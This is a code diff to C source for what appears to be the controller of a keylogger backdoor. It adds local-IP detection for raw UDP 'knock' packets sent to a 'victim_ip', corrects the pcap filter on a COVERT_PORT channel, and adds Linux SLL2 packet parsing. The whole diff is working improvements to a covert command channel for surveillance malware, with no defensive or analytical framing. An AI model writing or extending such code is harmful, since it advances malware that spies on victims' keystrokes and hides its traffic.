@@ -1,6 +1,8 @@
 #include <arpa/inet.h>
 #include <errno.h>
+#include <ifaddrs.h>
 #include "keylogger.h"
+#include <net/if.h>
 #include <netinet/ip.h>
 #include <pcap.h>
 #include <pthread.h>
@@ -37,6 +39,7 @@ typedef struct {
     int sock;
     void *pcap_handle;
     struct sockaddr_in peer_addr;
+    struct in_addr local_addr;
     uint32_t next_seq;
     uint32_t expected_response_seq;
     int connected;
@@ -283,6 +286,32 @@ static uint16_t ip_checksum(const void *buf, size_t len) {
     return (uint16_t)(~sum & 0xFFFFu);
 }
 
+static int get_local_ip(struct in_addr *out_addr) {
+    struct ifaddrs *ifaddr;
+    struct ifaddrs *ifa;
+    int found = 0;
+
+    if (getifaddrs(&ifaddr) != 0) {
+        return -1;
+    }
+
+    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
+        if (ifa->ifa_addr == NULL) continue;
+        if (ifa->ifa_addr->sa_family != AF_INET) continue;
+        if ((ifa->ifa_flags & IFF_UP) == 0) continue;
+        if ((ifa->ifa_flags & IFF_LOOPBACK) != 0) continue;
+        if ((ifa->ifa_flags & IFF_RUNNING) == 0) continue;
+        *out_addr = ((struct sockaddr_in *)ifa->ifa_addr)->sin_addr;
+        if (out_addr->s_addr != 0) {
+            found = 1;
+            break;
+        }
+    }
+
+    freeifaddrs(ifaddr);
+    return found ? 0 : -1;
+}
+
 static int send_raw_knock(const char *victim_ip, uint16_t port, uint16_t ip_id) {
     int sock;
     struct sockaddr_in dest;
@@ -293,7 +322,6 @@ static int send_raw_knock(const char *victim_ip, uint16_t port, uint16_t ip_id) 
         uint16_t dst_port;
         uint16_t length;
         uint16_t checksum;
-        uint8_t payload;
     } udp_hdr;
     struct {
         uint32_t src;
@@ -327,6 +355,12 @@ static int send_raw_knock(const char *victim_ip, uint16_t port, uint16_t ip_id) 
         return -1;
     }
 
+    struct in_addr local_ip;
+    if (get_local_ip(&local_ip) != 0) {
+        close(sock);
+        return -1;
+    }
+
     memset(packet, 0, sizeof(packet));
     ip_data = (struct ip *)packet;
 
@@ -339,7 +373,7 @@ static int send_raw_knock(const char *victim_ip, uint16_t port, uint16_t ip_id) 
     ip_data->ip_off = 0;
     ip_data->ip_ttl = 64;
     ip_data->ip_p   = IPPROTO_UDP;
-    ip_data->ip_src.s_addr = htonl(INADDR_ANY);
+    ip_data->ip_src = local_ip;
     ip_data->ip_dst = dest.sin_addr;
 
 #ifdef __APPLE__
@@ -356,10 +390,9 @@ static int send_raw_knock(const char *victim_ip, uint16_t port, uint16_t ip_id) 
     udp_hdr.dst_port = htons(port);
     udp_hdr.length    = htons(sizeof(udp_hdr));
     udp_hdr.checksum  = 0;
-    udp_hdr.payload   = 0;
 
     memset(&pseudo, 0, sizeof(pseudo));
-    pseudo.src   = ip_data->ip_src.s_addr;
+    pseudo.src   = local_ip.s_addr;
     pseudo.dst   = ip_data->ip_dst.s_addr;
     pseudo.zero  = 0;
     pseudo.proto = IPPROTO_UDP;
@@ -413,6 +446,12 @@ static int session_open(session_t *session, const char *victim_ip) {
     snprintf(session->peer_ip, sizeof(session->peer_ip), "%s", victim_ip);
     session->connected = 1;
 
+    if (get_local_ip(&session->local_addr) != 0) {
+        fprintf(stderr, "Unable to determine local IP address for raw sockets\n");
+        session_close(session);
+        return -1;
+    }
+
     if (session_open_pcap(session) != 0) {
         session_close(session);
         return -1;
@@ -450,7 +489,7 @@ static int session_open_pcap(session_t *session) {
         return -1;
     }
 
-    snprintf(filter_expr, sizeof(filter_expr), "udp src port %u", (unsigned)COVERT_PORT);
+    snprintf(filter_expr, sizeof(filter_expr), "udp dst port %u", (unsigned)COVERT_PORT);
     if (pcap_compile((pcap_t *)session->pcap_handle, &filter, filter_expr, 1, PCAP_NETMASK_UNKNOWN) == 0) {
         (void)pcap_setfilter((pcap_t *)session->pcap_handle, &filter);
         pcap_freecode(&filter);
@@ -533,7 +572,7 @@ static int session_send_raw(const session_t *session, uint8_t command, const uin
     ip_data->ip_off = 0;
     ip_data->ip_ttl = 64;
     ip_data->ip_p   = IPPROTO_UDP;
-    ip_data->ip_src.s_addr = htonl(INADDR_ANY);
+    ip_data->ip_src = session->local_addr;
     ip_data->ip_dst = session->peer_addr.sin_addr;
 #ifdef __APPLE__
     ip_data->ip_len = (uint16_t)total_len;
@@ -544,8 +583,8 @@ static int session_send_raw(const session_t *session, uint8_t command, const uin
     ip_data->ip_sum = ip_checksum(ip_data, sizeof(struct ip));
 
     memset(&pseudo, 0, sizeof(pseudo));
-    pseudo.src = ip_data->ip_src.s_addr;
-    pseudo.dst = ip_data->ip_dst.s_addr;
+    pseudo.src = session->local_addr.s_addr;
+    pseudo.dst = session->peer_addr.sin_addr.s_addr;
     pseudo.zero = 0;
     pseudo.proto = IPPROTO_UDP;
     pseudo.len = htons((uint16_t)(sizeof(udp_hdr) + udp_payload_len));
@@ -618,6 +657,10 @@ static void pcap_session_handler(u_char *args, const struct pcap_pkthdr *header,
         uint16_t proto; memcpy(&proto, packet + 14, 2);
         if (ntohs(proto) != 0x0800) return;
         ip_hdr = packet + 16;
+    } else if (pcap_dl == DLT_LINUX_SLL2) {
+        uint16_t proto; memcpy(&proto, packet + 18, 2);
+        if (ntohs(proto) != 0x0800) return;
+        ip_hdr = packet + 20;
     } else if (pcap_dl == DLT_NULL) {
         uint32_t family; memcpy(&family, packet, 4);
         if (family != 2) return;
